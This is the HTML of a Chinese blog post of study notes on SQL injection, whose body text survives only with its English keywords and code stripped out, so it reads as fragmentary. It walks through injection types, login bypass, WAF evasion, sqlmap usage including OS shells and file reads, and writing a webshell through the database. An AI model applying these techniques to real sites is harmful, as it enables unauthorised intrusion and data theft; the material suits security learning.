<!DOCTYPE html><html lang="zh-CNs" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SQL注入 | VV</title><meta name="keywords" content="web,后端漏洞"><meta name="author" content="VVkladg0r"><meta name="copyright" content="VVkladg0r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SQL注入"><meta name="application-name" content="SQL注入"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="SQL注入"><meta property="og:url" content="http://cszvvds.cc/2024/05/13/SQL%E6%B3%A8%E5%85%A5/index.html"><meta property="og:site_name" content="VV"><meta property="og:description" content="SQL后端漏洞 前置SQL 是用于访问和处理数据库的标准的计算机语言 primary key: 主键   用于区分表格中的元素  使元素唯一确定   可以多个 foreign key :外键  用于对应另一表格的主键 创建资料库： CREATE DATABASE  资料库 名字	(反引号); 列出所"><meta property="og:locale" content="zh-CNs"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="VVkladg0r"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="SQL后端漏洞 前置SQL 是用于访问和处理数据库的标准的计算机语言 primary key: 主键   用于区分表格中的元素  使元素唯一确定   可以多个 foreign key :外键  用于对应另一表格的主键 创建资料库： CREATE DATABASE  资料库 名字	(反引号); 列出所"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://cszvvds.cc/2024/05/13/SQL%E6%B3%A8%E5%85%A5/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"VV:QAQ","backTitle":"VV!"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: VVkladg0r","link":"链接: ","source":"来源: VV","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'VV',
  title: 'SQL注入',
  postAI: '',
  pageFillDescription: 'SQL, 前置, 使用, SQL注入基础, 简单分类, 1.按数据类型分类, 2.按照数据提交的方式来分类, 3.按照执行效果来分类, 4.其他类型注入, 联合攻击, 堆叠攻击, 布尔盲注, 时间盲注, 报错注入, 其他用到的函数：, 万用密码, 原理, 常用万用密码, 简单Bypass 绕过, 报错注入, 报错函数, Updatexml(), extractvalue(), 其他注入函数, exp(), floor(), 各种报错注入的万能语句, 宽字节注入, 前置, 注入条件, 理解与使用, 偏移量注入, 前置, 利用条件, 使用, 堆叠注入, 前置, 使用, 限制, 二次注入, 理解, 使用, DNSlong注入, 前置, 定义：, 使用场景：, 拓展：, 原理, 使用条件, 使用, sql盲注, 配合xss, 配合SSRF, 配合XXE, 配合命令执行, MongoDB 注入, 简介：, 1.数组绑定时的注入, 2.拼接字符串时的注入, 其他注入, 中转注入, 伪静态注入, json注入, 1.简介, 2、JSON结构, 3.JSON注入, 4.如何避免 JSON 注入, SQLMAP使用, 参数：, 常用指令, 绕WAF, 原理：, 指令, -levelx2F-risk, 执行指定的SQL语句, 执行OS系统命令, 读取服务器文件, SQL写马, into outfile, 利用条件, 1.此方法利用的先决条件, 2.secure_file_priv, 写入webshell, 1.注入点判断, 2.判断列数, 3.写入webshell, 4.连接webshell, –os-shell, 原理, 使用, 如何寻找web文件路径, 利用mysql的函数, –sql-shell, 其他方法, 提权, 日志马, 全局日志写马, 慢日志写马, 其他数据库, access数据库, mssql数据库后端漏洞前置是用于访问和处理数据库的标准的计算机语言主键用于区分表格中的元素使元素唯一确定可以多个外键用于对应另一表格的主键创建资料库资料库名字反引号列出所有资料库删除资料库资料库名字选择资料库资料库名使用整数有小数点的小数两个参数字符串最多存放的字符数二进制资料图片影片档案日期记录时间创建表格表格名属性名类型属性名类型展示表格表格名删除表格表格名新增表格属性表格名属性类型删除表格属性表格名属性向表格中存资料表格名属性搜寻表格中的全部资料表格名限制在创建时在属性后可以加限制不可用为空不可重复预设值自动加一修改资料表格名属性名改后名属性名原来名删除资料表格名属性属性等也可以取得资料属性属性表格后面也可以加限制排序属性由高到低从上到下反过来去不重复的资料聚合函数表格中的某属性的总数算平均算最高算最低算总和万用字符多字符一个字符将于连接在一起多个搜寻结合连结两个表格子查询若删去一项则另一项也将改变变成一起删去单行注释多行注释内联注释保持与其他数据兼容在不兼容的数据库中不执行而在中执行注入基础原理通过在向数据库的语言中进行一些更改使原来的指令发生一些改变进而获取一些本得不到的信息查库名查表名查字段简单分类按数据类型分类数字型注入点在端大概是这种形式其注入点类型为数字所以叫数字型注入点这一类的语句原型大概为表名组合出来的注入语句为字符型注入点在端大概是这种形式其注入点类型为字符类型所以叫字符型注入点这一类的语句原型大概为表名注意多了引号组合出来的注入语句为搜索型注入点这是一类特殊的注入类型这类注入主要是指在进行数据搜索时没过滤搜索参数一般在链接地址中有关键字有的不显示在的链接地址里面而是直接通过搜索框表单提交此类注入点提交的语句其原形大致为表名字段关键字组合出来的注入语句为测试测试按照数据提交的方式来分类注入提交数据的方式是注入点的位置在参数部分比如有这样的一个链接是注入点注入使用方式提交数据注入点位置在数据部分提交方式主要适用于表单的提交用于登录框的注入常用的万能语句用于输入都没有错误用于输入都没有错误型盲注通杀注入请求的时候会带上客户端的注入点存在当中的某个字段中有报错信息可以利用报错注入第一步寻找参数位置这样带参数第二步去掉参数观察参数影响将删掉看页面是否正常正常则说明参数不起作用反之不正常说明参数在数据传递中启直接作用第三步先清空网址输入按键后弹出一个对话框内容是然后重新输入原来回车如果显示正常说明是用方式获取数据注释表示当前浏览器中的变量表示弹出一个对话框对字符串进行编码第四步判断是否存在漏洞将判断语句带入并重复第三步若正常不正常则说明存在注入漏洞并可以进行注入第五步注入构造注入还有结合括号中的子查询并不会返回具体的查询到的数据只是会返回或者如果外层的字段在子查询中存在则返回不存在则返回即使子查询的查询结果是只要是对应的字段是存在的子查询中则返回表名也可用报错注入头部注入注入点在请求头部的某个字段中比如存在字段中严格讲的话其实应该也是算头部注入的一种形式因为在请求的时候是头部的一个字段注入注入注入是用来识别通过代理或负载均衡方式连接到服务器的客户端最原始的地址的请求头字段如果系统采用了服务器后端获取数据如利用进行获取攻击者可以通过请求头信息就行伪造当然了这个也可以是一些注入语句如下构造头进行测试响应出现变化方式注入概念超全局变量中的许多预定义变量都是超全局的这意味着它们在一个脚本的全部作用域中都可以用这些超全局变量是获取在新版本已经无法获取了获取传参获取传参获取传参包含了诸如头部信息路径以及脚本位置等等信息的数组按照执行效果来分类基于布尔的盲注即可以根据返回页面判断条件真假的注入盲注是注入的一种指的是在不知道数据库返回值的情况下对数据中的内容进行猜测实施注入盲注一般分为布尔盲注和基于时间的盲注和报错的盲注函数返回字符串的长度截取字符串返回字符的码将程序挂起一段时间为秒判断语句如果第一个语句正确就执行第二个语句如果错误执行第三个语句布尔型页面只返回和两种类型页面利用页面返回不同逐个猜解数据报错型构造让信息通过错误提示回显出来一种类型其它的暂时不怎么了解是先报字段数再利用后台数据库报错机制回显跟一般的报错区别是一般的报错注入是爆出字段数后在此基础通过正确的查询语句使结果回显到页面后者是在爆出字段数的基础上使用能触发报错机制的注入语句基于时间的盲注即不能根据页面返回内容判断任何信息用条件语句查看时间延迟语句是否执行即页面返回时间是否增加来判断在注入过程中无论注入是否成功页面完全没有变化此时只能通过使用数据库的延时函数来判断注入点一般采用响应时间上的差异来判断是否存在注入即基于时间型的盲注基于报错注入即页面会返回错误信息或者把注入的语句的结果直接返回在页面中报错注入导致主键重复联合查询注入可以使用的情况下的注入二次注入二次注入可以理解为攻击者构造的恶意数据存储在数据库后恶意数据被读取并进入到查询语句所导致的注入防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中当程序调用存储在数据库中的恶意数据并执行查询时就发生了二次注入堆查询注入可以同时执行多条语句的执行时的注入在中分号是用来表示一条语句的结束堆叠注入可以执行任何人语句但是当或数据库引擎的不支持堆叠注入就不能进行啦其他类型注入偏移注入注入注入注入注入宽字节注入具体怎么注入后面学了在写联合攻击通过来进行攻击堆叠攻击在一处注入点同时执行两种命令比如删库布尔盲注用于无回显判断库名长度判断具体字符判断表名长度判断具体字符判断字段名长度查字段主要会用查码返回字符串长度截取字符串将号掉个方向看结果有没有变化来判断布尔盲注有没有用后面就继续猜表名列名然后内容判断数据库名长度截取数据库名第个字符并转换成码判断具体值时间盲注跟布尔盲注一样主要用使网页回复变慢使条件同时成立主要通过网页回复时间来判断前面的语句是否正确慢就对报错注入通过网页的报错获取目标信息主要用返回一个效应的值当出现格式错误时爆出语法错误跟差不多其他用到的函数将数据连接起来从第开始取取个与一样与一样从左向右取把写入指定文件中万用密码原理万能密码利用的原理就是在后台登陆页面没有对用户输入的内容进行验证此时程序所用用户输入的数据都合法的所以这个时候无论是合法的管理员还是非法的入侵者所输入的数据都是被信任的非法入侵者正是利用这一特点来进行非法登录的账号随意输入密码用户进行用户名和密码验证时网站需要查询数据库查询数据库就是执行语句用户登录时后台执行的数据库查询操作语句是用户名密码由于网站后台在进行数据库查询的时候没有对单引号进行过滤当输入用户名和万能密码时执行的语句为由于语句中逻辑运算符具有优先级优先于优先于且适用传递性因此此语句在后台解析时分成两句和两句值进行逻辑运算恒为语句的查询结果为就意味着认证成功也可以登录到系统中输入用户名密码即可登录成功在网站开发中也有些人是这样做的是表名是数据库中字段名和是变量如果变量赋值为变量赋值为的话这根本不会有什么问题和上面一模一样即等价于但是如果变量赋值随意输入而被赋值那么整个语句就变成了这个样子可以看出此时整个查询语句返回值始终为常用万用密码简单绕过用编码改写特殊字符关键字过滤双写大小写替换特殊字符过滤空格内联取代注释取代逗号参数混淆加入更多的混淆参数并改变注入位置用无效参数溢出宽字节绕过拼接字符串函数替换不能使用函数时使语句来限制查询结果的列数一通过注释符绕过注释符通过在关键词的中间加入注释符使关键词不被识别如改为二通过绕过如改为三通过改变大小写绕过四如果被过滤可以将用替换用替换五通过重复关键词绕过六通过编码绕过七等价函数与命令绕过函数或变量举例和无法使用时或者过滤逗号后面过滤逗号后面会写一个详细的整理清楚的这个写的太乱了报错注入报错注入用在数据库的错误信息会回显在网页中的情况如果联合查询不能使用首选报错注入报错注入利用的是数据库的报错信息得到数据库的内容这里需要构造语句让数据库报错报错函数函数是对文档数据进行查询和修改的函数函数也是对文档数据进行查询和修改的函数中用于取整的函数其他用于报错的函数还有种但常用的就这三个对于和我们就需要构造格式错误也就是我们将的值传递成不符合格式的参数就会报错它是一个内容替换函数主要针对数据第一个参数是格式为文档对象名称中文为第二个参数格式的字符串用于匹配与正则语法不同第三个参数替换查找到的符合条件的数据使用查询当前数据库的用户信息以及数据库版本信息获取当前数据库下数据表信息获取表名的列名信息获取数据表下两列名的用户字段信息爆数据库版本信息链接用户链接数据库爆库爆表爆字段爆字段内容第一个参数格式为文档对象名称第二个参数格式字符串返回结果为连接参数产生的字符串使用获取当前是数据库名称及使用数据库的版本信息获取当前位置所用数据库的位置获取表名获取表的列名获取对应的列名的信息其他注入函数函数返回的次方当的值足够大的时候就会导致函数的结果数据类型溢出也就会因此报错先查询这个语句的结果然后将查询出来的数据作为一个结果集取名为然后在查询查询将结果集全部查询出来查询完成语句成功执行返回值为再取反按位取反运算符调用的时候的那个数的次方就会造成大数据类型溢出就会报错使用获取表名获取列名获取列名对应信息适用数据库版本是之类的相似函数同样可以利用数据溢出的方式进行报错注入主键重复方式的报错注入利用的函数有利用这个相对固定的语句格式导致的数据库报错相关函数是一个随机函数通过一个固定的随机数的种子之后产生大于等于小于的伪随机序列函数的作用就是返回小于等于括号内该值的最大整数也就是取整进行分组排序相同名字合并对中的重复性的数据进行了整合然后计数后面的就是每一类的数量使用查询的内容各种报错注入的万能语句通过报错注入语句如下通过报错注入语句如下通过报错注入语句如下通过报错注入语句如下通过报错注入语句如下通过报错注入语句如下通过报错注入语句如下通过报错注入语句如下通过报错注入语句如下通过报错注入语句如下通过报错注入语句如下通过报错注入语句如下宽字节注入前置单字节字符集所有的字符都使用一个字节来表示比如编码多字节字符集在多字节字符集中一部分字节用多个字节来表示另一部分可能没有用单个字节来表示两位的多字节字符有一个前导字节和尾字节在某个多字节字符集内前导字节位于某个特定范围内尾字节也一样编码是一种编码的编码方式多字节编码它可以使用个字节表示一个符号根据不同的符号而变化字节长度常见的宽字节不存在宽字节注入可以收集存在宽字节注入的编码注入条件要有宽字节注入漏洞首先要满足目标程序使用双多字节字符集进行解析其次不同字符集范围不一样可能低位不包含单字节字符集的字符这样就没办法了所以要保证在该种字符集范围中包含低字节位比如的字符即转义符理解与使用宽字节带来的安全问题主要是吃字符一个字节的现象我们这里的宽字节注入是利用的的一个特性的在使用编码的时候会认为两个字符是一个汉字前一个码要大于才到汉字的范围这就是的的特性因为是多字节编码他认为两个字节代表一个汉字所以和后面的也就是中变成了一个汉字运而逃逸了出来当提交时的运行的语句为很明显这是没有注入成功的而当我们提交的运行的语句为運也就是说与的十六进制编码拼接被识别成運有宽字节注入漏洞直接遍历宽字节注入常用于绕过一些转义的函数当配置文件中添加或者使用使用一些转义函数比如和他们会转义单引号双引号反斜杠与字符转义的方法是在符号前加使注入语句失效此时可以用宽字节注入来绕过或不使用他们转义的符号来注入偏移量注入前置偏移注入是比较独有的一种注入手段一般用于在猜出了表名但是没有猜出列名的情况下使用无列名注入根据一个较多字段的表对一个少字段的表进行偏移注入原理借用数据库的自连接查询让数据库内部发生乱序从而偏移出所需要的字段在我们的页面上显示通过我们补充的使两张表对齐并通过移动的位置使我们需要的数据与页面所展示的数据对齐进而将我们需要的数据展示出来用处使用场景偏移注入是解决一些注入不出来列表的时候同时要求支持列名足够多需要知道表名在注入的时候会遇到一些无法查询列名的问题比如系统自带数据库的权限不够而无法访问系统自带库当你猜到表名无法猜到字段名的情况下我们可以使用偏移注入来查询那张表里面的数据像之类的工具实际上是爆破字段的名字但是如果字段名称比较奇葩就无可奈何了利用条件知道表名但不知道列名支持联合查询联合查询前面的查询语句列数要比注入的后面的查询的列数要多使用判断注入点查询字段个数正常错误爆出显位判断表内存在的字段个数错误错误直到正确所以表下有个字段在中间使用时要用表名即特在某些情况下通过偏移注入我们获取不到想要的数据怎么办假设表中存在字段首先给表重命名获取一样的字段这样做我们可以打乱随机顺序不过这样之后作为一个整体查询字段数要乘以爆列名数据一级偏移语句如果你发现上面查看了网页源码也爆不出数据请用以下方法二级偏移语句偏移注入的基本公式为出的字段数减去号的字段数然而再用的字段数减去倍刚才得出来的答案堆叠注入前置可以同时执行多条语句的执行时的注入在中分号是用来表示一条语句的结束堆叠注入可以执行的是任意的语句而执行的语句类型是有限的可以用来执行查询语句使用更新的用户密码为还可以用于删库等一系列命令不止局限于查询限制堆叠注入的局限性在于并不是每一个环境下都可以执行可能受到或者数据库引擎不支持的限制当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序虽然我们前面提到了堆叠查询可以执行任意的语句但是这种注入方式并不是十分的完美的在我们的系统中因为代码通常只返回一个查询结果因此堆叠注入第二个语句产生错误或者结果只能被忽略我们在前端界面是无法看到返回结果的如上面的实例如果我们不输出密码那我们是看不到这个结果的因此在读取数据时我们建议使用联合注入同时在使用堆叠注入之前我们也是需要知道一些数据库相关信息的例如表名列名等信息二次注入理解二次注入可以理解为攻击者构造的恶意数据存储在数据库后恶意数据被读取并进入到查询语句所导致的注入防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中当程序调用存储在数据库中的恶意数据并执行查询时就发生了二次注入第一次注入第二次触发第一次的注入语句中的某些符号被转义了但是仍被存储在数据库中此时数据库中的注入语句的转义符是不会被存储进来的即存储在数据库中的注入语句是完整的只是尚未被拼接在语句中第二次会请求第一次注入的数据去执行相关命令此时因为程序可能认为已存储在数据库中的数据是安全的就会直接调用其数据并未对其进行转义等处理使第一次的注入语句被完整调用实现注入使用第一步插入恶意数据进行数据库插入数据时对其中的特殊字符进行了转义处理在写入数据库的时候又保留了原来的数据第二步引用恶意数据开发者默认存入数据库的数据都是安全的在进行查询时直接从数据库中取出恶意数据没有进行进一步的检验的处理使用实例如下点击注册用户这里注册用户名为此时我们查看数据库注册的用户已经存储进去了并且的密码是对注册的账号进行登录然后修改密码为此时提示密码已经成功修改了此时我们发现反倒是的密码被修改成了而我们注册的用户的密码并没有被修改漏洞原因在进行用户注册的允许存在和这种特殊字符在修改密码页面的源码中发现这里很明显存在注入漏洞当我们登录账号并修改密码时这条语句就变成了如下这个样子把后面的代码都注释掉了所以修改了用户的密码为注入前置定义注入也可以称之为带外查询是一种注入姿势可以通过查询相应的解析记录来获取我们想要的数据使用场景一般情况下在我们无法通过联合查询直接获取数据的情况下我们只能通过盲注来一步步的获取数据但是使用盲注手工测试是需要花费大量的时间的可能会想到使用直接去跑出数据但在实际测试中使用跑盲注有很大的几率网站把给封掉此时就可以使用带外注入拓展中有个系统属性为表示不允许导入导出指定文件夹时表示的导入导出只能发生在指定的文件夹没有设置时则表示没有任何限制函数函数读取一个文件并将其内容作为字符串返回语法为其中是文件的完整路径使用条件文件必须位于服务器主机上你必须具有该权限才能读取该文件拥有该权限的用户可以读取服务器主机上的任何文件该文件是的或服务器可读的此属性与状态相关文件必须是所有人都可读的并且它的大小小于字节路径什么是路径路径就是类似这样的形式的网络路径它符合格式其中是服务器名是共享资源的名称目录或文件的名称可以包括共享名称下的目录路径格式为例如把自己电脑的文件共享你会获得如下路径这就是路径这也就解释了为什么函数拼接了个了双斜杠表示网络资源路径多加两个就是转义了反斜杠通过盲注需要用的函数所以一般得是权限查看可以读取的磁盘当为空就可以读取磁盘的目录当为就可以读取盘的文件当为就不能加载文件使用注入需要使用一个服务器用于记录我们注入的信息并返回一些有用的信息类似于日志平台是临时的网址不常用了要注册原理我们注入的指令会被服务器发送给服务器并被记录下来使用条件需要用户具备文件读取的权限因为要借助到的读取文件的函数权限不够的话不能调用这个函数其实只要配置项中开启了配置就可以通过语句来执行文件读写操作目标数据库服务器能访问外网使用盲注是某个网址这是最基本的用法来看看利用盲注来回显利用函数将查询的数据库名和域名拼接执行后查看或者构造查库名或查表名爆第一个表名爆第二个表名爆第三个表名查字段名配合盲打在安全测试的时候是比较常用的配合配合当我们遇到如果这个漏洞可以解析外部实体那么不用说就可以拿来读取本地服务器文件这时我们只需把文件改成这样配合命令执行注入要考遇到了再学先放在这里已学简介是一个基于分布式文件存储的数据库是一个介于关系数据库和非关系数据库之间的产品它的特点是高性能易部署易使用存储数据非常方便默认情况下是没有认证的这就导致不熟悉它的研发人员部署后没有做访问控制导致可以未授权登录与几乎支持相同语法的数据库相反数据库具有不同的语法实现注入在登录时如果是这种关系型的数据库我们可以构造真值等式来绕过如在中同样可以中的相当于在中的那么我们可以这样绕过在攻击前我们需要先建立一个集合作为攻击的基础用户是攻击者已经知道账号密码的一个测试账号其他账号的话密码随机想通过注入获取其他账号的密码数组绑定时的注入一个数组绑定的查询如下选择数据库选择集合未找到此时的攻击利用了可以传递数组参数的一个特性当传入的为执行了语句如果此时传入的如下则就是一个数组也就相当于执行了语句此时的攻击利用了可以传递数组参数的一个特性当传入的为执行了语句如果此时传入的如下则就是一个数组也就相当于执行了语句而对于多维数组的解析使最终执行了如下语句利用此特性我们可以传入数据是数组的键名为一个操作符大于小于等于不等于等等完成一些攻击者预期的查询如传入因为传入的键名正是一个操作符最终执行了语句这句话相当于如果此时的用户名与密码不能回显只是返回一个逻辑上的正误判断那么我们可以采用操作符来一位一位获取数据拼接字符串时的注入攻击方式报错想办法闭合语句该语句能返回一个数组键值是键值是爆版本爆所有集合名因为返回的是数组需要用转换为字符串并且函数区分大小写爆集合的第一条数据爆集合的第二条数据因为方法支持多语句执行所以可以执行太多语句了不演示当然有时可能遇到没有输出返回数据这时候怎么办呢在高版本下添加了一个函数就是时间盲注咯在高版本下貌似不能用注释语句此外高版本还有一个新特性就是默认开启错误回显笔者尝试没有注释成功只能用闭合的方法其他注入中转注入把参数中转一下再发送到指定网址上去可以对请求携带的参数进行二次加工有一说一我感觉这只能是对题的见招拆招说是一种单独的注入方式感觉有点草率了这类题会将我们注入的语句发送到指定网址进行一些处理加密等再发送出去所以我们可以直接抓包发给重发器处理后发出去或这写一个文件将数据直接进行相应的处理用拼接读取文件获取参数然后直接访问这个文件进行传参让这个文件来访问注入成功可能会有回显伪静态注入好吧感觉又是像中转注入一样伪静态看似是静态页面实则是动态页面伪静态动态静态在上有差别伪静态的可能会有数字等让后端能明白要调用那个文件剩下的就和正常的注入一样了注入也是几乎不考先放在这里考了再学简介是一种轻量级的数据交换格式易于阅读和编写同时也易于机器解析和生成它是基于的一个子集采用完全独立于语言的文本格式但是也使用类似于语言家族的习惯等都可以使用这些特性使成为理想的数据交换语言可以将中的对象转换为字符串然后在函数网络之间传递这个字符串结构建构于两种结构名称值对的集合不同的语言中它被理解为对象纪录结构字典哈希表有键列表或者关联数组值的有序列表在大部分语言中它被理解为数组例如下面一段示例使最简单的示例名称值对键值对当需要表示一组值的时候不但能够提供高可读性而且可以减少复杂性例如表示一个管理员表在中如下注入注入是指应用程序所解析的数据来源于不可信赖的数据源程序没有对这些不可信赖的数据进行验证过滤如果应用程序使用未经验证的输入构造则可以更改数据的语义在相对理想的情况下攻击者可能会插入无关的元素导致应用程序在解析数据时抛出异常在中是根据引号冒号逗号花括号来区分各字符的意义的如果向中注入恶意字符那么将解析失败例如输入的值为那么在语句中为为了成功解析我们可以把转换为注入和注入注入一样都需要对影响语句的内容进行转义如双引号花括号等如何避免注入检查程序逻辑根据实际需求对数据进行合理过滤和安全校验以避免产生注入后台代码对数据进行编码使用安全防止注入使用首先是一个自动化的注入工具内自带用参数查看的参数与使用方法中直接输入即可使用参数常用指令是我们抓取的的请求包指定参数当有多个参数而你又知道参数存在漏洞你就可以使用指定参数进行探测如果我们已经知道这里是注入点的话可以在其后面加个来让对其注入探测该是否存在漏洞抓取的当该网站需要登录时探测该是否存在漏洞抓取其提交的数据填入查看数据库的所有用户查看数据库用户名的密码有时候使用不能获取到密码则可以试下当时当时查看数据库当前的用户判断当前用户是否有管理员权限列出数据库所有管理员角色仅适用于数据库的时候爆出所有的数据库爆出所有的数据表爆出数据库中所有的列查看当前的数据库爆出数据库中的所有的表爆出数据库中表中的所有的列爆出数据库中的表中的列中的所有数据爆出数据库中的表中的列中的前条数据爆出数据库中的表中的所有数据爆出数据库中的所有数据爆出该数据库中的所有数据指定脚本进行过滤用代替空格探测等级平台危险等级都是最高级别当时会测试注入当时会测试注入执行指定的语句执行命令获取目标服务器权限执行命令将目标权限弹到上读取目标服务器盘下的文件将本地的文件上传到目标服务器的盘下并且名字为指定其数据库为其他数据库使用任意的爆破指定代理当爆破网站会出现超时的话可以使用参数指定时间延迟注入这个参数可以指定使用的探测技术默认情况下会测试所有的方式当然我们也可以直接手工指定支持的探测方式如下布尔型注入报错型注入可联合查询注入可多语句查询注入基于时间延迟注入知道网站的账号密码直接连接输出详细度最大值会显示请求包和回复包指定线程数清除缓存清空会话重构注入对所有的交互式的都是默认的任意的头对提交的数据进行编码伪造字段保持连接当出现保错的时候使用这个参数绕原理只用对参数进行修改来绕过官方提供的绝大部分脚本是用正则模块替换攻击载荷字符编码的方式来绕过的检测规则指令检测是否有使用参数进行绕过使用任意头进行绕过尤其是在配置不当的时候使用长的延时来避免触发的机制这方式比较耗时使用参数污染进行绕过尤其是在平台上使用代理进行绕过禁止使用系统的代理直接连接进行注入清空会话重构注入或者进行字符码转换对移动端的服务器进行注入匿名注入为我们准备了绕过的脚本在文件夹文件夹下使用情况如下使用方法用全角字符替换单引号字符用非法双字节字符替换单引号字符在末尾添加空字符编码对给定的全部字符使用编码分别用替换大于号替换等于号在语句之后用有效的随机空白符替换空格符随后用替换等于号对给定的全部字符使用双重编码不处理已经编码的字符对给定的全部字符使用编码不处理已经编码的字符对给定的的非编码字符使用编码不处理已经编码的字符用替换像的实例用运算符替换全部等于号用函数替换大于号在每个关键字之前添加注释用替换像的实例用小写值替换每个关键字字符用注释包围完整的查询用当中带有数字零的注释包围完整的查询在关键字周围添加多个空格用替换预定义关键字适用于过滤器转换给定的当中的所有字符在每个字符之前添加一个百分号随机转换每个关键字字符的大小写向关键字中插入随机注释添加经过特殊构造的字符串向末尾添加用替换空格符用破折号注释符其次是一个随机字符串和一个换行符替换空格符用磅注释符其次是一个随机字符串和一个换行符替换空格符用磅注释符其次是一个随机字符串和一个换行符替换空格符用一组有效的备选字符集当中的随机空白符替换空格符用磅注释符其次是一个换行符替换空格符用一组有效的备选字符集当中的随机空白符替换空格符用破折号注释符其次是一个换行符替换空格符用加号替换空格符用一组有效的备选字符集当中的随机空白符替换空格符用替换用一个多字节组合和末尾通用注释一起替换空格符添加一个头来绕过用注释包围每个非函数关键字用注释包围每个关键字添加一个伪造的头来绕过一共有个探测等级默认是等级越高说明探测时使用的也越多其中级的最多会自动破解出等头部注入当然等级越高探测的时间也越慢这个参数会影响测试的注入点和的数据都会进行测试在为时就会测试头在为时就会测试在不确定哪个参数为注入点时为为保证准确性建议设置为一共有个危险等级也就是说你认为这个网站存在几级的危险等级和探测等级一个意思在不确定的情况下建议设置为级工具使用目录伪造头部可以在请求中伪造请求头中的当大于等于时会进行注入执行指定的语句执行指定的语句执行系统命令当且仅当数据库是时可以执行当数据库是时需要满足个条件权限已经知道目标站点的绝对路径的参数值时空未修改前是执行命令过程中会向指定路径传入两个文件木马文件和退出时输入和才可以删除传入的文件读取服务器文件前提数据库是和读取目标服务器盘下的文件上传文件到数据库服务器前提数据库是将本地的文件上传到目标服务器自身上传完成之后会进行验证读取文件大小进行对比写马利用条件此方法利用的先决条件目录具有写权限能够使用单引号知道网站绝对路径根目录或则是根目录往下的目录都行没有具体值在中查看最好网站是权限是用来限制函数在哪个目录下拥有上传和读取文件的权限在版本以后的值默认为如下关于的配置介绍的值为表示限制不允许导入导出当的值为表示限制的导入导出只能发生在目录下当的值没有具体值时表示不对的导入导出做限制所以如果我们要想使用函数写入一句话的话就需要将的值设为没有值那如何设置了修改的值只能通过手动打开配置文件进行修改不能直接使用语句进行修改看参数的值如下的值默认为则表示限制不允许导入导出修改的值我们可以在中查看是否有的参数如果没有的话我们就添加即可此时再查看的值如下已经变为空了设置完成后我们就可以利用这个函数来写入一句话木马还有一个兄弟时两者的区别是只能导出一行而支持多行保留数据的原始格式未进行转义而会对数据进行转义写入我们以第七关为例注入点判断输入正确的语法正常显示错误的语法显示说语法错误页面只存在两种状态判断为盲注我们输入时成功延时所以注入点就为我们输入的字符被包含在单引号中且单引号外有两个双引号包裹判断列数我们使用语句判断列数时正常显示时不正常判断为列写入加如此前我们已经通过一些方法获取到了网站的根目录则可以写入一句话一句话建议进行十六进制转码不用编码也可以编码后然后在最前面加上如下我们将一句话木马进行十六进制编码后写入了根目